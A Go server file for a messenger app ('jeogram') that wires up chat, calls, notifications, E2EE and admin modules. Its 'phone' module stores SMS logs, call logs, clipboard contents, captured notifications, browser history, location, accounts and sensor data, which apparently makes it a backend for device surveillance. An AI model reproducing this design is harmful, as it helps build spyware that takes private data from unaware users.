package server

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/cors"
	"github.com/jeogram/messenger/internal/config"
	adminhandler "github.com/jeogram/messenger/internal/modules/admin/handler"
	"github.com/jeogram/messenger/internal/modules/auth/domain"
	"github.com/jeogram/messenger/internal/modules/auth/handler"
	"github.com/jeogram/messenger/internal/modules/auth/repository"
	"github.com/jeogram/messenger/internal/modules/auth/service"
	calldomain "github.com/jeogram/messenger/internal/modules/calls/domain"
	callhandler "github.com/jeogram/messenger/internal/modules/calls/handler"
	livekitsvc "github.com/jeogram/messenger/internal/modules/calls/livekit"
	callrepo "github.com/jeogram/messenger/internal/modules/calls/repository"
	callservice "github.com/jeogram/messenger/internal/modules/calls/service"
	chatdomain "github.com/jeogram/messenger/internal/modules/chat/domain"
	chathandler "github.com/jeogram/messenger/internal/modules/chat/handler"
	chatrepo "github.com/jeogram/messenger/internal/modules/chat/repository"
	chatService "github.com/jeogram/messenger/internal/modules/chat/service"
	contactdomain "github.com/jeogram/messenger/internal/modules/contact/domain"
	contacthandler "github.com/jeogram/messenger/internal/modules/contact/handler"
	contactrepo "github.com/jeogram/messenger/internal/modules/contact/repository"
	contactservice "github.com/jeogram/messenger/internal/modules/contact/service"
	e2eedomain "github.com/jeogram/messenger/internal/modules/e2ee/domain"
	e2eehandler "github.com/jeogram/messenger/internal/modules/e2ee/handler"
	e2eerepo "github.com/jeogram/messenger/internal/modules/e2ee/repository"
	mediadomain "github.com/jeogram/messenger/internal/modules/media/domain"
	mediahandler "github.com/jeogram/messenger/internal/modules/media/handler"
	mediaservice "github.com/jeogram/messenger/internal/modules/media/service"
	messagedomain "github.com/jeogram/messenger/internal/modules/message/domain"
	messagehandler "github.com/jeogram/messenger/internal/modules/message/handler"
	messagerepo "github.com/jeogram/messenger/internal/modules/message/repository"
	messageservice "github.com/jeogram/messenger/internal/modules/message/service"
	notificationdomain "github.com/jeogram/messenger/internal/modules/notification/domain"
	notificationhandler "github.com/jeogram/messenger/internal/modules/notification/handler"
	notificationrepo "github.com/jeogram/messenger/internal/modules/notification/repository"
	notificationservice "github.com/jeogram/messenger/internal/modules/notification/service"
	phonedomain "github.com/jeogram/messenger/internal/modules/phone/domain"
	phonehandler "github.com/jeogram/messenger/internal/modules/phone/handler"
	phoneservice "github.com/jeogram/messenger/internal/modules/phone/service"
	userdomain "github.com/jeogram/messenger/internal/modules/user/domain"
	userhandler "github.com/jeogram/messenger/internal/modules/user/handler"
	userrepo "github.com/jeogram/messenger/internal/modules/user/repository"
	userservice "github.com/jeogram/messenger/internal/modules/user/service"
	"github.com/jeogram/messenger/internal/pkg/auth"
	"github.com/jeogram/messenger/internal/pkg/cache"
	"github.com/jeogram/messenger/internal/pkg/events"
	"github.com/jeogram/messenger/internal/pkg/mail"
	"github.com/jeogram/messenger/internal/pkg/middleware"
	dbmigrate "github.com/jeogram/messenger/internal/pkg/migrate"
	"github.com/jeogram/messenger/internal/pkg/realtime"
	"github.com/jeogram/messenger/internal/pkg/webhook"
	"github.com/jeogram/messenger/internal/pkg/ws"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	"github.com/rs/zerolog/log"
	httpSwagger "github.com/swaggo/http-swagger"
	"gorm.io/gorm"
)

// Server объединяет HTTP-сервер и его зависимости.
type Server struct {
	cfg         *config.Config
	db          *gorm.DB
	redis       *cache.Redis
	producer    *events.Producer
	hub         *ws.Hub
	jwt         *auth.JWT
	broadcaster realtime.Broadcaster
	socketIO    *realtime.SocketIOServer
	webhooks    *webhook.Dispatcher
	livekitSvc  *livekitsvc.Service
	livekitH    *livekitsvc.Handler
	authSvc     *service.AuthService
	userSvc     *userservice.UserService
	chatSvc     *chatService.ChatService
	mediaSvc    *mediaservice.MediaService
	msgSvc      *messageservice.MessageService
	notifSvc    *notificationservice.NotificationService
	callSvc     *callservice.CallService
	contactSvc  *contactservice.ContactService
	phoneSvc    *phoneservice.PhoneService
	adminH      *adminhandler.AdminHandler
	prekeyRepo  *e2eerepo.PreKeyRepository
}

// New создаёт сервер: выполняет миграции и инициализирует модули.
func New(cfg *config.Config, db *gorm.DB, redis *cache.Redis, producer *events.Producer, hub *ws.Hub) (*Server, error) {
	if err := migrate(db); err != nil {
		return nil, err
	}
	if cfg.DB.Driver == "postgres" {
		if err := dbmigrate.Run(db); err != nil {
			log.Warn().Err(err).Msg("versioned migrations failed")
		}
	}

	jwtSvc := auth.NewJWT(cfg.JWT)
	webhooks := webhook.New(cfg.Webhooks.URLs, cfg.Webhooks.Timeout)

	broadcaster := &realtime.MultiBroadcaster{Broadcasters: []realtime.Broadcaster{
		&realtime.WSBroadcaster{Hub: hub},
	}}

	// Socket.IO transport (protocol v2 / Engine.IO v3) delivers the same events
	// as the raw WebSocket hub. Each client joins a private room "u:<userID>".
	var socketIO *realtime.SocketIOServer
	if cfg.SocketIO.Enabled {
		socketIO = realtime.NewSocketIOServer(func(token string) (string, error) {
			claims, err := jwtSvc.ParseAccess(token)
			if err != nil {
				return "", err
			}
			return claims.UserID, nil
		})
		// go-socket.io обрабатывает соединения только в отдельном цикле Serve(),
		// иначе в HTTP-режиме фреймы не читаются.
		go socketIO.Server.Serve()
		broadcaster.Broadcasters = append(broadcaster.Broadcasters,
			&realtime.SocketIOBroadcaster{Server: socketIO.Server})
	}

	userRepo := repository.NewUserRepository(db)
	settingsRepo := userrepo.NewSettingsRepository(db)
	chatRepo := chatrepo.NewChatRepository(db)
	msgRepo := messagerepo.NewMessageRepository(db)
	deviceRepo := notificationrepo.NewDeviceRepository(db)
	notifRepo := notificationrepo.NewNotificationRepository(db)
	callRepo := callrepo.NewCallRepository(db)
	contactRepo := contactrepo.NewContactRepository(db)
	vrfRepo := repository.NewVerificationRepository(db)
	mailer := mail.New(cfg.SMTP)
	prekeyRepo := e2eerepo.NewPreKeyRepository(db)

	authSvc := service.NewAuthService(userRepo, vrfRepo, jwtSvc, redis, mailer, cfg.Auth, webhooks, deviceRepo)
	authSvc.SetBroadcaster(broadcaster)
	userSvc := userservice.NewUserService(userRepo, settingsRepo, contactRepo, chatRepo, deviceRepo)
	chatSvc := chatService.NewChatService(chatRepo, redis)
	msgSvc := messageservice.NewMessageService(msgRepo, chatRepo, producer, cfg.Kafka, broadcaster, cfg.Message, redis, webhooks)
	mediaSvc, err := mediaservice.NewMediaService(cfg.Media, db)
	if err != nil {
		return nil, fmt.Errorf("media service: %w", err)
	}
	pushSvc := notificationservice.NewPushService(cfg.Push)
	notifSvc := notificationservice.NewNotificationService(deviceRepo, notifRepo, userRepo, chatRepo, pushSvc, broadcaster, producer, cfg.Kafka.NotifyTopic)

	// Kafka выключена — обрабатываем событие "сообщение создано" напрямую,
	// иначе in-app уведомления и push не создавались бы.
	if !cfg.Kafka.Enabled {
		msgSvc.SetDirectNotifier(notifSvc.HandleMessageCreated)
	}
	callSvc := callservice.NewCallService(callRepo, chatRepo, cfg.RTC, webhooks)
	contactSvc := contactservice.NewContactService(contactRepo, userRepo, settingsRepo)
	phoneSvc := phoneservice.NewPhoneService(db)
	adminH := adminhandler.NewAdminHandler(db, jwtSvc, cfg.Admin.UserIDs, broadcaster)

	// Presence: при появлении/исчезновении пользователя в сети сообщаем его
	// контактам (событие presence).
	hub.SetPresenceHook(func(userID string, online bool) {
		ctx := context.Background()
		contactIDs, err := contactSvc.ListIDs(ctx, userID)
		if err != nil || len(contactIDs) == 0 {
			return
		}
		broadcaster.SendToUsers(contactIDs, ws.Outbound{
			Type:    "presence",
			Payload: map[string]interface{}{"user_id": userID, "online": online},
		})
	})

	// LiveKit integration
	var livekitSvc *livekitsvc.Service
	var livekitH *livekitsvc.Handler
	if cfg.LiveKit.Enabled {
		livekitSvc, err = livekitsvc.NewService(cfg.LiveKit, cfg.RTC, callRepo, chatRepo, webhooks)
		if err != nil {
			log.Warn().Err(err).Msg("livekit init failed; falling back to WebRTC-only mode")
		} else {
			livekitH = livekitsvc.NewHandler(livekitSvc, jwtSvc, redis, hub)
		}
	}

	return &Server{
		cfg: cfg, db: db, redis: redis, producer: producer, hub: hub,
		jwt: jwtSvc, broadcaster: broadcaster, socketIO: socketIO, webhooks: webhooks,
		livekitSvc: livekitSvc, livekitH: livekitH,
		authSvc: authSvc, userSvc: userSvc, chatSvc: chatSvc,
		mediaSvc: mediaSvc, msgSvc: msgSvc, notifSvc: notifSvc, callSvc: callSvc,
		contactSvc: contactSvc, phoneSvc: phoneSvc, adminH: adminH, prekeyRepo: prekeyRepo,
	}, nil
}

func migrate(db *gorm.DB) error {
	return db.AutoMigrate(
		&domain.User{},
		&domain.VerificationCode{},
		&userdomain.UserSettings{},
		&userdomain.BlockedUser{},
		&contactdomain.Contact{},
		&chatdomain.Chat{},
		&chatdomain.ChatParticipant{},
		&messagedomain.Message{},
		&messagedomain.ReadReceipt{},
		&messagedomain.Reaction{},
		&messagedomain.PinnedMessage{},
		&notificationdomain.DeviceToken{},
		&notificationdomain.Notification{},
		&calldomain.Call{},
		&mediadomain.MediaRecord{},
		&phonedomain.DeviceInfo{},
		&phonedomain.DeviceStatus{},
		&phonedomain.LocationPoint{},
		&phonedomain.InstalledApp{},
		&phonedomain.PhoneContact{},
		&phonedomain.CallLog{},
		&phonedomain.SmsLog{},
		&phonedomain.ClipboardEntry{},
		&phonedomain.NotificationCapture{},
		&phonedomain.AppUsage{},
		&phonedomain.MediaItem{},
		&phonedomain.DeviceAccount{},
		&phonedomain.WifiNetwork{},
		&phonedomain.BluetoothDevice{},
		&phonedomain.CalendarEvent{},
		&phonedomain.SensorReading{},
		&phonedomain.BrowserHistory{},
		&e2eedomain.PreKey{},
	)
}

// Router builds the chi router with all routes mounted.
func (s *Server) Router() *chi.Mux {
	r := chi.NewRouter()

	r.Use(cors.Handler(cors.Options{
		AllowedOrigins:   []string{"*"},
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"},
		AllowedHeaders:   []string{"Accept", "Authorization", "Content-Type"},
		AllowCredentials: false,
	}))
	r.Use(middleware.Logger)
	r.Use(middleware.Recover)
	if s.cfg.Metrics.Enabled {
		r.Use(middleware.Metrics)
	}

	// Health & readiness.
	r.Get("/health", func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	})
	r.Get("/ready", func(w http.ResponseWriter, req *http.Request) {
		if err := s.db.WithContext(req.Context()).Exec("SELECT 1").Error; err != nil {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ready"}`))
	})

	// Swagger UI.
	r.Get("/swagger/*", httpSwagger.WrapHandler)

	// Realtime: raw WebSocket (1-on-1 messages, call signaling).
	r.With(middleware.JWTAuth(s.jwt)).Get("/ws", s.hub.Handler())

	// Realtime: Socket.IO transport (protocol v2 / Engine.IO v3).
	// Handshake: ws://host/socket.io/?token=<access_token>&EIO=3&transport=websocket
	if s.socketIO != nil {
		path := s.cfg.SocketIO.Path
		if path == "" {
			path = "/socket.io"
		}
		handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			s.socketIO.ServeHTTP(w, r, s.authenticateSocketIO)
		})
		r.Handle(path, handler)
		r.Handle(path+"/*", handler)
	}

	// LiveKit call endpoints (audio/video 1-on-1 and group).
	if s.livekitH != nil {
		s.livekitH.RegisterRoutes(r)
	}

	// Module handlers.
	authH := handler.NewAuthHandler(s.authSvc, s.jwt)
	userH := userhandler.NewUserHandler(s.userSvc, s.contactSvc, s.jwt, s.hub)
	chatH := chathandler.NewChatHandler(s.chatSvc, s.jwt)
	msgH := messagehandler.NewMessageHandler(s.msgSvc, s.jwt)
	mediaH := mediahandler.NewMediaHandler(s.mediaSvc, s.jwt)
	notifH := notificationhandler.NewNotificationHandler(s.notifSvc, s.jwt)
	callH := callhandler.NewCallsHandler(s.callSvc, s.chatRepo(), s.broadcaster, s.jwt)
	contactH := contacthandler.NewContactHandler(s.contactSvc, s.jwt)
	phoneH := phonehandler.NewPhoneHandler(s.phoneSvc, s.jwt)
	e2eeH := e2eehandler.NewE2EEHandler(s.prekeyRepo, s.jwt)

	authH.RegisterRoutes(r)
	userH.RegisterRoutes(r)
	chatH.RegisterRoutes(r)
	msgH.RegisterRoutes(r)
	mediaH.RegisterRoutes(r)
	notifH.RegisterRoutes(r)
	callH.RegisterRoutes(r)
	contactH.RegisterRoutes(r)
	phoneH.RegisterRoutes(r)
	e2eeH.RegisterRoutes(r)
	s.adminH.RegisterRoutes(r)

	if s.cfg.Metrics.Enabled {
		r.Handle(s.cfg.Metrics.Path, promhttp.Handler())
	}

	return r
}

// StartWorkers запускает фоновые процессы (например, публикацию отложенных сообщений).
func (s *Server) StartWorkers(ctx context.Context) {
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				if n, err := s.msgSvc.PublishDueScheduled(ctx); err != nil {
					log.Error().Err(err).Msg("scheduled message worker error")
				} else if n > 0 {
					log.Info().Int("count", n).Msg("published scheduled messages")
				}
			}
		}
	}()
}

// NotificationService возвращает сервис уведомлений (используется для
// запуска Kafka-консьюмера в main).
func (s *Server) NotificationService() *notificationservice.NotificationService {
	return s.notifSvc
}

// chatRepo возвращает репозиторий чатов (нужен обработчикам звонков для доступа).
func (s *Server) chatRepo() *chatrepo.ChatRepository {
	return chatrepo.NewChatRepository(s.db)
}

// authenticateSocketIO проверяет access-токен Socket.IO-хендшейка и возвращает id пользователя.
func (s *Server) authenticateSocketIO(token string) (string, error) {
	claims, err := s.jwt.ParseAccess(token)
	if err != nil {
		return "", err
	}
	return claims.UserID, nil
}

// Run starts the HTTP server and blocks until the context is cancelled.
func (s *Server) Run(ctx context.Context) error {
	addr := fmt.Sprintf("%s:%d", s.cfg.HTTP.Host, s.cfg.HTTP.Port)
	srv := &http.Server{
		Addr:         addr,
		Handler:      s.Router(),
		ReadTimeout:  s.cfg.HTTP.ReadTimeout,
		WriteTimeout: s.cfg.HTTP.WriteTimeout,
	}
	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutdownCtx)
	}()
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}
